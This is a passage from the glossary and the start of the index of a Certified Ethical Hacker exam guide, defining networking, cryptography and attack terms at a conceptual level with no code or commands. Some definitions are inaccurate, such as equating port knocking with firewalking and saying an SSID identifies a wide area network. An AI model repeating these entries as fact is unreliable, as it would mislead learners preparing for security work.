Point-to-Point Protocol (PPP) Provides router-to-router or host-to-network connec-
tions over asynchronous and synchronous circuits.

16-Glossary.indd 550 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

551

Point-to-Point Tunneling Protocol (PPTP) A VPN tunneling protocol with encryp-
tion. PPTP connects two nodes in a VPN by using one TCP port for negotiation and
authentication and one IP protocol for data transfer.

polymorphic virus Malicious code that uses a polymorphic engine to mutate while
keeping the original algorithm intact; the code changes itself each time it runs, but the
function of the code does not change.

port address translation (PAT) A NAT method in which multiple internal hosts,
using private IP addressing, can be mapped through a single public IP address using the
session IDs and port numbers. An internal global IP address can support in excess of
65,000 concurrent TCP and UDP connections.

port knocking Another term for firewalking, the method of externally testing ports
on a firewall by generating a connection attempt on each port, one by one. See also
firewalking.

port redirection The process of directing a protocol from one port to another.

port scanning The process of using an application to remotely identify open ports on
a system (for example, whether systems allow connections through those ports).

POST An HTTP command to transmit text to a web server for processing. This is the
opposite of an HTTP GET.

Post Office Protocol 3 (POP3) An Application layer protocol used by local e-mail
clients to retrieve e-mail from a remote server over a TCP/IP connection.

Presentation layer Layer 6 of the OSI reference model. The Presentation layer ensures
information sent by the Application layer of the sending system will be readable by the
Application layer of the receiving system.

Pretty Good Privacy (PGP) A data encryption/decryption program often used for
e-mail and file storage.

private cloud A cloud deployment model operated solely for a single organization
(aka single-tenant environment) and is usually not pay-as-you-go.

private key The secret portion of an asymmetric key pair, typically used to decrypt or
digitally sign data. The private key is never shared and is always used for decryption, with
one notable exception: the private key is used to encrypt the digital signature.

private network address A nonroutable IP address range intended for use only within
the confines of a single organization, falling within the predefined range of 10.0.0.0,
172.16–31.0.0, or 192.168.0.0.

promiscuous mode A configuration of a network card that makes the card pass all
traffic it receives to the central processing unit rather than just frames addressed to it—a
feature normally used for packet sniffing and bridged networking for hardware virtual-
ization. Windows machines use WinPcap for this; Linux uses libcap.

16-Glossary.indd 551 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

552

protocol A formal set of rules describing data transmission, especially across a net-
work. A protocol determines the type of error checking, the data compression method,
how the sending device will indicate completion, how the receiving device will indicate
the message was received, and so on.

protocol stack A set of related communications protocols operating together as a
group to address communication at some or all of the seven layers of the OSI refer-
ence model.

proxy server A device set up to send a response on behalf of an end node to the
requesting host. Proxies are generally used to obfuscate the host from the Internet.

public cloud A cloud deployment model where services are provided over a network
that is open for public use (such as the Internet).

public key The public portion of an asymmetric key pair, typically used to encrypt
data or verify signatures. Public keys are shared and are used to encrypt messages.

public key infrastructure (PKI) A set of hardware, software, people, policies, and pro-
cedures needed to create, manage, distribute, use, store, and revoke digital certificates.

pure insider An employee with all the rights and access associated with being employed
by the company.

purple team A single team of security professionals who perform cooperative vulner-
ability and penetration assessments (CVPA).

qualitative risk assessment A nonnumerical, subjective risk evaluation. This is used
with qualitative assessment (an evaluation of risk that results in ratings of none, low,
medium, or high for the probability).

quality of service (QoS) A defined measure of service within a network system—
administrators may assign a higher QoS to one host, segment, or type of traffic.

quantitative risk assessment Calculations of two components of risk (R): the mag-
nitude of the potential loss (L) and the probability (P) that the loss will occur.

queue A backlog of packets stored in buffers and waiting to be forwarded over
an interface.

reconnaissance The steps taken to gather evidence and information on the targets
you want to attack.

remote access Access by information systems (or users) communicating from outside
the information system security perimeter.

replay attack An attack where the hacker repeats a portion of a cryptographic exchange
in hopes of fooling the system into setting up a communications channel.

Requests for Comments (RFCs) Published by the IETF (Internet Engineering Task
Force), a series of documents and notes on standards used or proposed for use on the
Internet; each is identified by a number.

16-Glossary.indd 552 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

553

reverse lookup; reverse DNS lookup Used to find the domain name associated with
an IP address; the opposite of a DNS lookup.

reverse social engineering A social engineering attack that manipulates the victim
into calling the attacker for help.

resource identifier (RID) The last portion of the security identifier (SID) that identi-
fies the user, computer, or domain to the system in Windows. A RID of 500 identifies
the administrator account.

Rijndael An encryption standard designed by Joan Daemen and Vincent Rijmen. This
was chosen by a NIST contest to become the Advanced Encryption Standard (AES).

ring topology A networking configuration where all nodes are connected in a circle
with no terminated ends on the cable.

risk The potential for damage to or loss of an IT asset.

risk acceptance An informed decision to accept the potential for damage to or loss of
an IT asset.

risk assessment An evaluation conducted to determine the potential for damage to
or loss of an IT asset.

risk avoidance A decision to reduce the potential for damage to or loss of an IT asset
by taking some type of action.

risk transference Shifting responsibility for damage to or loss of an IT asset from one
party to another—for example, through purchasing an insurance policy.

rogue access point A wireless access point that either has been installed on a secure
company network without explicit authorization from a local network administrator or
has been created to allow a hacker to conduct a man-in-the-middle attack.

role-based access control An approach to restricting system access to authorized
users in which roles are created for various job functions. The permissions to perform
certain operations are assigned to specific roles. Members of staff (or other system users)
are assigned particular roles, and through those role assignments they acquire the permis-
sions to perform particular system functions.

rolling code Also known as hopping code, the code used by a key fob to unlock (and,
in some cases, start) a car. Stealing this code and reusing it is referred to as a rolling
code attack.

rootkit A set of tools (applications or code) that enables administrator-level access to
a computer or computer network and is designed to obscure the fact that the system has
been compromised. Rootkits are dangerous malware entities that provide administrator
control of machines to attackers and are difficult to detect and remove.

Roots of Trust (RoT) A set of functions within the Trusted Computing Model that are
always trusted by the computer’s operating system.

16-Glossary.indd 553 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

554

route 1. The path a packet travels to reach the intended destination. Each individual
device along the path traveled is called a hop. 2. Information contained on a device con-
taining instructions for reaching other nodes on the network. This information can be
entered dynamically or statically.

routed protocol A protocol defining packets that are able to be routed by a router.

router A device that receives and sends data packets between two or more networks.
The packet headers and a forwarding table provide the router with the information nec-
essary for deciding which interface to use to forward packets.

Routing Information Protocol (RIP) A distance-vector routing protocol that employs
the hop count as a routing metric. The “hold down time,” used to define how long a
route is held in memory, is 180 seconds. RIP prevents routing loops by implementing
a limit on the number of hops allowed in a path from the source to a destination. The
maximum number of hops allowed for RIP is 15. This hop limit, however, also limits
the size of networks that RIP can support. A hop count of 16 is considered an infi-
nite distance and is used to deprecate inaccessible, inoperable, or otherwise undesirable
routes in the selection process.

Routing Protocol A standard developed to enable routers to exchange messages con-
taining information about routes to reach subnets in the network.

rule-based access control A set of rules defined by a system administrator that indi-
cates whether access is allowed or denied to resource objects.

Sarbanes-Oxley (SOX) Act U.S. law created to make corporate disclosures more accu-
rate and reliable in order to protect the public and investors from shady behavior. There
are 11 titles within SOX.

scope creep The change or growth of a project’s scope.

script kiddie A derogatory term used to describe an attacker, usually new to the field,
who uses simple, easy-to-follow scripts or programs developed by others to attack com-
puter systems and networks and deface websites.

secure channel A means of exchanging information from one entity to another using
a process that does not provide an attacker the opportunity to reorder, delete, insert, or
read information.

Secure Multipurpose Mail Extension (S/MIME) A standard for encrypting and
authenticating MIME data; used primarily for Internet e-mail.

Secure Sockets Layer (SSL) A protocol that uses a private key to encrypt data before
transmitting confidential documents over the Internet; widely used on e-commerce, bank-
ing, and other sites requiring privacy. Largely replaced by TLS (Transport Layer Security).

Security Accounts Manager (SAM) File in Windows that stores all the password
hashes for the system.

16-Glossary.indd 554 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

555

Security as a Service (SECaaS) A cloud computing type providing penetration test-
ing, intrusion detection, and other security services.

security breach or security incident The exploitation of a security vulnerability.

security bulletin An announcement, typically from a software vendor, of a known
security vulnerability in a program; often the bulletin contains instructions for the appli-
cation of a software patch.

security by obscurity A principle in security engineering that attempts to use anonym-
ity and secrecy (of design, implementation, and so on) to provide security; the footprint of
the organization, entity, network, or system is kept as small as possible to avoid interest by
hackers. The danger is that a system relying on security by obscurity may have theoretical
or actual security vulnerabilities that its owners or designers believe are not known.

security controls Safeguards or countermeasures to avoid, counteract, or minimize
security risks.

security defect An unknown deficiency in software or some other product that results
in a security vulnerability being identified.

security identifier (SID) The method by which Windows identifies user, group, and
computer accounts for rights and permissions.

security incident response team (SIRT) A group of experts that handles computer
security incidents.

security kernel The central part of a computer or communications system hardware,
firmware, and software that implements the basic security procedures for controlling
access to system resources.

segment A section or subset of the network. Often a router or other routing device
provides the endpoint of the segment.

separation of duties The concept of having more than one person required to com-
plete a task.

Serial Line Internet Protocol (SLIP) A protocol for exchanging packets over a serial line.

service level agreement (SLA) A part of a service contract where the level of service is
formally defined; may be required as part of the initial pen test agreement.

service set identifier (SSID) A value assigned to uniquely identify a single wide area
network (WAN) in wireless LANs. SSIDs are broadcast by default and are sent in the
header of every packet. SSIDs provide no encryption or security.

service-oriented architecture (SOA) A design approach that makes it easier for appli-
cation components to cooperate and exchange information on systems connected over
a network: it’s designed to allow software components to deliver information directly to
other components over a network.

16-Glossary.indd 555 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

556

session hijacking An attack in which a hacker steps between two ends of an already
established communication session and uses specialized tools to guess sequence numbers
to take over the channel.

Session layer Layer 5 of the OSI reference model. The mechanism for opening, clos-
ing, and managing a session between end-user application processes resides here.

session splicing A method used to prevent IDS detection by dividing the request into
multiple parts that are sent in different packets.

sheepdip A stand-alone computer, kept off the network, that is used for scanning
potentially malicious media or software.

shoulder surfing Looking over an authorized user’s shoulder in order to steal informa-
tion (such as authentication information).

shrink-wrap code attacks Attacks that take advantage of the built-in code and scripts
most off-the-shelf applications come with.

sidejacking A hacking method for stealing the cookies used during a session build and
replaying them for unauthorized connection purposes.

signature scanning A method for detecting malicious code on a computer by com-
paring the files to signatures of known viruses stored in a database.

sign-in seal An e-mail protection method using a secret message or image that can be
referenced on any official communication with the site; if an e-mail is received without
the image or message, the recipient knows it is not legitimate.

Simple Mail Transfer Protocol (SMTP) An Application layer protocol for sending
electronic mail between servers.

Simple Network Management Protocol (SNMP) An Application layer protocol for
managing devices on an IP network.

Simple Object Access Protocol (SOAP) A protocol used for exchanging structured
information, such as XML-based messages, in the implementation of web services.

single loss expectancy (SLE) The monetary value expected from the occurrence of a
risk on an asset. It is mathematically expressed as

single loss expectancy (SLE) = asset value (AV) × exposure factor (EF)
where EF is represented in the impact of the risk over the asset, or percentage of asset
lost. As an example, if the AV is reduced by two-thirds, the exposure factor value is 0.66.
If the asset is completely lost, the EF is 1.0. The result is a monetary value in the same
unit as the SLE is expressed.

site survey An inspection of a place where a company or individual proposes to work,
to gather the necessary information for a design or risk assessment.

smartcard A card with a built-in microprocessor and memory used for identification
or financial transactions. The card transfers data to and from a central computer when
inserted into a reader.

16-Glossary.indd 556 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

557

smishing An attack using text messaging, where a user is tricked into downloading
malware onto his cellular phone or other mobile device.

Smurf attack A denial-of-service attack where the attacker sends a large number of
pings to the network’s broadcast address from the spoofed IP address of the target. All
systems in the subnet then respond to the spoofed address, eventually flooding the device.

sniffer Computer software or hardware that can intercept and log traffic passing over
a digital network.

SOA record Start of Authority record, which identifies the primary name server for
the zone. The SOA record contains the hostname of the server responsible for all DNS
records within the namespace, as well as the basic properties of the domain.

social engineering A nontechnical method of hacking. Social engineering is the art
of manipulating people, whether in person (human based) or via computing methods
(computer based), into providing sensitive information.

Software as a Service (SaaS) A type of cloud computing used as a software distribu-
tion model.

source routing A network traffic management technique designed to allow applica-
tions to specify the route a packet will take to a destination, regardless of what the route
tables between the two systems say.

spam An electronic version of junk mail; unsolicited commercial e-mail sent to numer-
ous recipients.

spoofing A method of falsely identifying the source of data packets; often used by
hackers to make it difficult to trace where an attack originated.

spyware A type of malware that covertly collects information about a user.

stateful packet filtering A method of network traffic filtering that monitors the
entire communications process, including the originator of the session and from which
direction it started.

steganography The art and science of creating a covert message or image within
another message, image, audio, or video file.

stream cipher A symmetric key cipher where plain-text bits are combined with a pseu-
dorandom cipher bit stream (keystream), typically by an exclusive-or (XOR) operation.
In a stream cipher, the plain-text digits are encrypted one at a time, and the transforma-
tion of successive digits varies during the encryption.

suicide hacker A hacker who aims to bring down critical infrastructure for a “cause”
and does not worry about the penalties associated with his actions.

supervisory control and data acquisition (SCADA) A centralized supervisory control
system generally used for controlling and monitoring industrial facilities and infrastruc-
ture. SCADA consists of a control server (SCADA-MTU), communications devices, and
distributed field sites (used to actually monitor and control specific operations).

16-Glossary.indd 557 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

558

Sybil attack An IoT DoS attack using multiple forged identities to create the illusion
of traffic congestion, which affects everyone else in the local IoT network.

symmetric algorithm A class of algorithms for cryptography that use the same cryp-
tographic key for both decryption and encryption.

symmetric encryption A type of encryption where the same key is used to encrypt
and decrypt the message.

SYN attack A type of denial-of-service attack where a hacker sends thousands of SYN
packets to the target with spoofed IP addresses.

SYN flood attack A type of attack used to deny service to legitimate users of a net-
work resource by intentionally overloading the network with illegitimate TCP con-
nection requests. SYN packets are sent repeatedly to the target, but the corresponding
SYN/ACK responses are ignored.

syslog A protocol used for sending and receiving log information for nodes on
a network.

tailgating A physical security attack whereby an attacker has a fake badge and simply
follows an authorized person through the opened security door.

target of engagement (TOE) The software product or system that is the subject of an
evaluation.

Telnet A protocol used in networking to provide bidirectional, interactive, text-ori-
ented communication facility using a virtual terminal connection. Commands entered
locally are executed on the remote system.

Temporal Key Integrity Protocol (TKIP) A security protocol used in IEEE 802.11i to
replace WEP without the requirement to replace legacy hardware.

Terminal Access Controller Access-Control System (TACACS) A remote authentica-
tion protocol that is used to communicate with an authentication server commonly used
in Unix networks.

third party A person or entity indirectly involved in a relationship between two
principals.

threat Any circumstance or event with the potential to adversely impact organiza-
tional operations, organizational assets, or individuals through an information system via
unauthorized access, destruction, disclosure, modification of information, and/or denial
of service.

three-way (TCP) handshake A three-step process computers execute to negotiate a
connection with one another. The three steps are SYN, SYN/ACK, and ACK.

tiger team A group of people, gathered together by a business entity, working to
address a specific problem or goal.

16-Glossary.indd 558 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

559

time bomb A program designed to execute at a specific time to release malicious code
onto the computer system or network.

time to live (TTL) A limit on the amount of time or number of iterations or transmis-
sions in computer and network technology a packet can experience before it will be
discarded.

timestamping Recording the time, normally in a log file, when an event happens or
when information is created or modified.

Tini A small Trojan program that listens on port 777.

traceroute A utility that traces a packet from your computer to an Internet host,
showing how many hops the packet takes to reach the host and how long the packet
requires to complete the hop. The command differs in usage depending on the OS used;
tracert is used on Windows systems, whereas traceroute is used on Linux distributions.

Transmission Control Protocol (TCP) A connection-oriented, Layer 4 protocol for
transporting data over network segments. TCP is considered reliable because it guaran-
tees delivery and the proper reordering of transmitted packets. This protocol is used for
most long-haul traffic on the Internet.

Transport layer Layer 4 of the OSI reference model. Transport layer functions include
end-to-end delivery, segment order, reliability, and flow control, as well as TCP flags and
port numbering.

Transport Layer Security (TLS) A standard for encrypting e-mail, web pages, and
other stream-oriented information transmitted over the Internet.

trapdoor function A function that is easy to compute in one direction yet believed
to be difficult to compute in the opposite direction (finding its inverse) without special
information, called the trapdoor. This function is widely used in cryptography.

Trojan horse A non-self-replicating program that appears to have a useful purpose but
in reality has a different, malicious purpose.

trusted computing base (TCB) The set of all hardware, firmware, and/or software
components critical to IT security. Bugs or vulnerabilities occurring inside the TCB
might jeopardize the security properties of the entire system.

Trusted Computer System Evaluation Criteria (TCSEC) A U.S. Department of
Defense (DoD) standard that sets basic requirements for assessing the effectiveness of
computer security controls built into a computer system.

tumbling The act of using numerous electronic serial numbers on a cell phone until a
valid number is located.

tunnel A point-to-point connection between two endpoints created to exchange data.
Typically a tunnel is either an encrypted connection or a connection using a protocol in a
method for which it was not designed. An encrypted connection forms a point-to-point
connection between sites in which only the sender and the receiver of the data see it in
a clear state.

16-Glossary.indd 559 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

560

tunneling Transmitting one protocol encapsulated inside another protocol.

tunneling virus A self-replicating malicious program that attempts installation
beneath antivirus software by directly intercepting the interrupt handlers of the operat-
ing system to evade detection.

Unicode An international encoding standard, working within multiple languages and
scripts, that represents each letter, digit, or symbol with a unique numeric value that
applies across different platforms.

Uniform Resource Locator (URL) A string that represents the location of a web
resource—most often a website.

User Datagram Protocol (UDP) A connectionless, Layer 4 transport protocol. UDP is
faster than TCP but offers no reliability. A best effort is made to deliver the data, but no
checks and verifications are performed to guarantee delivery. Therefore, UDP is termed a
connectionless protocol. UDP is simpler to implement and is used where a small amount
of packet loss is acceptable, such as for streaming video and audio.

Vehicle Ad Hoc Network (VANET) The communications network used by IoT-enabled
vehicles; refers to the spontaneous creation of a wireless network for vehicle-to-vehicle
(V2V) data exchange.

virtual local area network (VLAN) Devices, connected to one or more switches,
grouped logically into a single broadcast domain. Administrators can divide the
devices connected to the switches into multiple VLANs without requiring separate
physical switches.

virtual private network (VPN) A technology that establishes a tunnel to create a pri-
vate, dedicated, leased-line network over the Internet. The data is encrypted so it’s read-
able only by the sender and receiver. Companies commonly use VPNs to allow employ-
ees to connect securely to the company network from remote locations.

virtualization A practice whereby the physical aspects of the hardware are virtually
presented to operating systems in a way that allows one or more virtual machines (with
their own operating systems) to run simultaneously on the same physical box.

virus A malicious computer program with self-replication capabilities that attaches to
another file and moves with the host from one computer to another.

virus hoax An e-mail message that warns users of a nonexistent virus and encourages
them to pass on the message to other users.

vishing Social engineering attacks using a phone.

vulnerability Weakness in an information system, system security procedures, internal
controls, or implementation that could be exploited or triggered by a threat source.

vulnerability assessment Formal description and evaluation of the vulnerabilities in
an information system.

16-Glossary.indd 560 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

Glossary

561

vulnerability management The cyclical practice of identifying, classifying, remediat-
ing, and mitigating vulnerabilities.

vulnerability scanning Sending packets or requests to another system to gain infor-
mation to be used to identify weaknesses and protect the system from attacks.

war chalking Drawing symbols in public places to alert others to an open Wi-Fi net-
work. War chalking can include the SSIDs, administrative passwords to APs, and other
information.

war dialing The act of dialing all numbers within an organization to discover open
modems.

war driving The act of searching for Wi-Fi wireless networks by a person in a moving
vehicle, using a portable device.

warm site An environmentally conditioned workspace partially equipped with IT and
telecommunications equipment to support relocated IT operations in the event of a
significant disruption.

web spider A program designed to browse websites in an automated, methodical
manner. Sometimes these programs are used to harvest information from websites, such
as e-mail addresses.

white hat An ethical hacker. White hat hackers are engaged to test the security of an
organization, and work solely within the bounds of an agreement that has been signed
and agreed upon by all parties before the assessment begins.

white-box testing A pen testing method where the attacker knows all information
about the internal network. It is designed to simulate an attack by a disgruntled systems
administrator or similar level.

whois A query and response protocol widely used for querying databases that
store the registered users or assignees of an Internet resource, such as a domain name,
an IP address, or an autonomous system.

wide area network (WAN) Two or more LANs connected by a high-speed line across
a large geographical area.

Wi-Fi A term trademarked by the Wi-Fi Alliance, used to define a standard for devices
to use to connect to a wireless network.

Wi-Fi Protected Access (WPA) Provides data encryption for IEEE 802.11 wireless net-
works so data can be decrypted only by the intended recipients.

Wired Equivalent Privacy (WEP) A security protocol for wireless local area networks
defined in the 802.11b standard; intended to provide the same level of security as a wired
LAN. WEP is not considered strong security, although it does authenticate clients to
access points, encrypt information transmitted between clients and access points, and
check the integrity of each packet exchanged.

16-Glossary.indd 561 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Glossary

CEH Certified Ethical Hacker All-in-One Exam Guide

562

wiretapping The monitoring of telephone or Internet conversations, typically by
covert means.

worm A self-replicating, self-propagating, self-contained program that uses networking
mechanisms to spread itself.

wrapper Software used to bind a Trojan and a legitimate program together so the
Trojan will be installed when the legitimate program is executed.

XOR operation A mathematical operation requiring two binary inputs: if the inputs
match, the output is a 0; otherwise, it is a 1.

Zenmap A Windows-based GUI version of Nmap.

zero subnet In a classful IPv4 subnet, the network number with all binary 0s in the
subnet part of the number. When written in decimal, the zero subnet has the same num-
ber as the classful network number.

zero-day attack An attack carried out on a system or application before the vendor
becomes aware and before a patch or fix action is available to correct the underlying
vulnerability.

zombie A computer system that performs tasks dictated by an attacker from a remote
location. Zombies may be active or idle, and owners of the systems generally do not
know their systems are compromised.

zone transfer A type of DNS transfer where all records from an SOA are transmit-
ted to the requestor. Zone transfers have two options: full (opcode AXFR) and incre-
mental (IXFR).

16-Glossary.indd 562 14/09/21 4:08 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

INDEX

3D printing, 178 address space layout randomization anonymizers, 119
3DES encryption, 414 (ASLR), 260 Anonymous, 394
4G standard, 294, 315 administrative controls, 17 anonymous footprinting, 53
5G standard, 315 administrators Anonymous hackers, 394
802.11 standards, 280–281 changing account name, 212 antennas, wireless, 282–284

enforcing password anti-malware programs, 372–375, 380

A restrictions, 192 antivirus. See AV
network monitoring, 159, 167, anycast, 152, 153

A records, 70 168, 169 Apache Mynewt, 319
Absinthe, 267 patches/software deployment, 219 Apache servers, 243, 245–247
AC system, 473 privileges, 216–219 APIs (application programming
acceptable use policy, 24 zone transfers, 71, 78 interfaces), 313, 358
access ADMmutate tool, 175 APNIC (Asia-Pacific Network

covering tracks, 31, 204, 219, ADS (alternate data stream), 220–222 Information Center), 74, 75
222–224 Advanced Encryption Standard Apple HFS file system, 220

gaining, 30 (AES), 287, 289, 414 Apple iOS, 307, 311–313.
government access to keys, Advanced Port Scanner, 115 See also mobile devices

420–421 adversary behavioral identification, 32 Apple TV, 311
maintaining, 30–31 AES (Advanced Encryption Application layer, 6–7, 148, 320

access card attacks, 457–458 Standard), 287, 289, 414 Application layer attacks, 393
access control lists (ACLs), 122, AfriNIC (African Network application logs, 223

173, 175 Information Center), 74, 75 application programming interfaces
access control policy, 24 AH (authentication header), 398, 437 (APIs), 313, 358
access control systems, 22–24 air quality, 473 application servers, 243
access controls, 22–24, 238, Aircrack, 289, 296 application-level attacks

474–477 AirMagnet WiFi Analyzer, 297 buffer overflows, 259–260
Access Gateway Layer, 320 AirPcap, 290, 291 considerations, 257, 393
access points (APs) ALE (annualized loss expectancy), 18 cookies, 260, 261–262

Cisco, 293 alexa.com, 56 countermeasures, 269–270
considerations, 281–282 algorithms, 411 cross-site scripting, 260–261
detecting, 291 Alibaba Cloud, 345 described, 28
multiple, 282 alternate data stream (ADS), executable code, 218–219
open, 290 220–222 LDAP injection attacks, 257–259
rogue, 282, 291, 292–293 Amazon, 352, 355 mobile platform, 468–469
wireless, 281, 286, 290, 292–293 Amazon Web Services. See AWS SQL injection, 263–267

ACK (acknowledgment), 9, 10, 396 “ambering out,” 161 web applications, 256–269
ACK flag, 92, 93, 107 American Registry for Internet application-level rootkits, 225
ACK scans, 107 Numbers (ARIN), 74, 75, 79, 80 applications
acknowledgment. See ACK American Standard Code for attacks on. See application-
ACLs (access control lists), 122, Information Interchange (ASCII), 6 level attacks

173, 175 Android phones. executing, 218–219
Active Directory Explorer, 130 See also mobile devices fake security apps, 469
active footprinting, 53–54, 56–57 applications, 308, 311, 313, 314 flaws in, 14
active online attacks, 209–212 Device Administration API, 313 malicious. See malware
active OS fingerprinting, 116 jailbreaking, 307, 311–315 mobile devices, 308, 311, 313, 314
active sniffing, 156–159 rooting, 311, 313 repackaging, 469
ad hoc connection attack, 293 ZitMo malware, 468 security, 237–239
ad hoc networks, 281 Angry IP Scanner, 105 web. See web applications
adaptive chosen plain-text attack, 442 annualized loss expectancy (ALE), 18 APs. See access points
Address Resolution Protocol. annualized rate of occurrence ARIN (American Registry for Internet

See ARP (ARO), 18 Numbers), 74, 75, 79, 80

563

17-Index.indd 563 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

564

ARM mbed OS, 319 mobile platform, 290, 468–469 authenticity, 22
Armitage, 217 on operating system, 28, authoritative servers, 71
ARO (annualized rate of 334–335 authority support social

occurrence), 18 password. See password cracking engineering, 457
ARP (Address Resolution Protocol), permanent, 393 authorization, 309, 321, 351

10, 148–151, 286 phishing. See phishing automated testing, 490
ARP broadcasts, 159 plain-text, 441–442 AutoRuns, 379
ARP cache, 149–151 replay, 442 AV (antivirus) programs.
ARP entries, 150–151 sequence, 395–397 See also virus entries
ARP packets, 159–160 session hijacking, 395–399 considerations, 390
ARP poisoning, 158–159, 213 session riding, 359 fake AV programs, 380, 466, 467
ARP requests, 149 shrink-wrap code, 28 heuristic, 390
ARP spoofing, 158–159 side-channel, 359, 442 malware attacks and, 372–375
ARPANET, 344 Smurf, 393 signature-based, 390
arpspoof tool, 159 social engineering. AV signatures, 373, 374
AS (authentication service), 193 See social engineering availability, 22
ASCII (American Standard Code for source-routing, 117 AWS (Amazon Web Services)

Information Interchange), 6 stealth, 219–226 considerations, 344, 345
Asia-Pacific Network Information SYN, 393 hacking and, 268–269, 358,

Center (APNIC), 74, 75 system. See system attacks 360–362
ASLR (address space layout teardrop, 393 network footprinting and, 79

randomization), 260 Trojan. See Trojans security testing and, 355
assets, 17, 472 viruses, 379–385 AWS cloud, 355, 359
Assistance and Access Act, 421 web applications, 256–269 AWS Cloud Security Report, 359
association, 284 web servers, 250–256 AWS Greengrass, 346
asymmetric encryption, 415–416 windowing, 396 Azure, 345
AtomSync, 131 wireless. See wireless hacking Azure IoT Edge service, 346
attacks. See also specific attacks worms, 383–385

access card attacks, 457–458 wrapping, 359 B
on applications. See application- Auditpol tool, 224

level attacks audits, security, 487 baby monitors, 326
authentication, 20, 290 authentication, 207–216 backdoors. See also Trojans
Bluetooth, 316–317 badges, 208 cloud hacking and, 361
brute-force, 214–215, 442, 443 biometric, 207 leaving open, 30
categories, 28 vs. confidentiality, 20 malware and, 374
cipher-based, 442 DES, 191 mobile computing, 309
cloud computing, 359 described, 284 Trojans and, 375–379
collision, 419, 422 EAP, 287 BackStreet Browser, 66
cross-guest VM breach, 359 IoT devices, 321, 331 backtracking, 250–251
cross-site scripting, 260–261 Kerberos, 191–195 backup generators, 473
cryptography, 441–443 LM, 191, 192 backups, 18, 210
DDoS, 269, 326, 392–394, 395 mobile computing, 308 badges, 208, 473
DNS, 69–72, 76, 77 multifactor, 207 bandwidth, 394
DoS, 22, 293, 294, 391–395 NTLM, 191, 192 banner grabbing, 102, 125–126, 175
evil twin, 292 one-factor, 207 baselines, 25
fraggle, 393 open system, 284, 285 Bash, 256
honeypots and, 178–180 overview, 207–208 Bashdoor, 256
injection, 237, 257–259, 327 passwords and, 207–216 Basic Encoding Rules (BER), 130
integrity, 20–21 pre-boot, 434 basic process control system
interference, 442 session hijacking and, 395, 398 (BPCS), 334
IoT devices, 306, 320–327 shared key, 284, 285 basic service area (BSA), 282
“low-hanging fruit,” 443 three-factor, 207 basic service set (BSS), 282
malware. See malware attacks two-factor, 207, 468 basic service set identifier
man-in-the-browser, 397 web servers, 237 (BSSID), 282
man-in-the-cloud, 359 wireless networks, 284–285, bastion hosts, 173
man-in-the-middle, 212, 327, 287, 297 Batch Worm Generator, 384

396, 442 authentication attacks, 20, 290 BCP (business continuity plan), 18
misconfiguration, 28, 253 authentication header (AH), 398, 437 Beacon, 397
mobile devices, 307, 310, 311–317 authentication service (AS), 193 beapy worm, 384

17-Index.indd 564 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

565

behavioral indicators, 34, 35 Brandon, John, 352 CBC-MAC (cipher block chaining
BER (Basic Encoding Rules), 130 “bricking,” 393 message authentication code), 287
beSTORM, 329 Brillo OS, 319 CC (Common Criteria), 23, 24
bettercap, 159 bring your own device (BYOD), CCAT (Cloud Container Attack
Beyond Trust tools, 329 307, 310, 313–314 Tool), 361
BGP (Border Gateway Protocol), 246 broadcast, 152, 153 CCMP (Cipher Block Chaining
BIA (business impact analysis), 18 broadcast addressing, 100 Message Authentication Code
“big brother,” 420–421 broadcast messages, 144–145 Protocol), 287
biometric authentication, 207 browser pivot, 397 CEH (Certified Ethical Hacker)
biometric identifiers, 474, 475 brute-force attacks, 214–215, 442, 443 certification, 3, 31
biometric passports, 208 Brutus tool, 254 cell phones. See smartphones
biometrics, 474, 475 BSA (basic service area), 282 Censys tool, 329
BIOS rootkit, 226 BSS (basic service set), 282 Centralized Authentication, 284
bit flipping, 22 BSSID (basic service set identifier), 282 CER (crossover error rate), 207,
bitcoin, 417 BT Browser, 317 475–476
BitCrypter, 374 btCrawler, 317 certificate authority (CA), 416,
BitLocker, 434 buckets, 360 425–427, 431–432
bits buffer overflows, 14, 259–260 certificate revocation list (CRL), 425

encrypted, 412–414 bump key, 478 certification tests, 31
frames, 9 Burp Suite, 242 certification-level exams, 3–5
salt, 420 business continuity plan (BCP), 18 Certified Ethical Hacker (CEH)
subnetting and, 98–102 business impact analysis (BIA), 18 certification, 3, 31

Black Hat Search Engine Business Wire, 55 chat channels, 468
Optimization (SEO), 374 BYOD (bring your own device), checksum, 375

black hats, 27 307, 310, 313–314 chntpw tool, 212
Black Widow tool, 242 chosen cipher attacks, 442
Blackberry phones, 311. C chosen plain-text attacks, 441

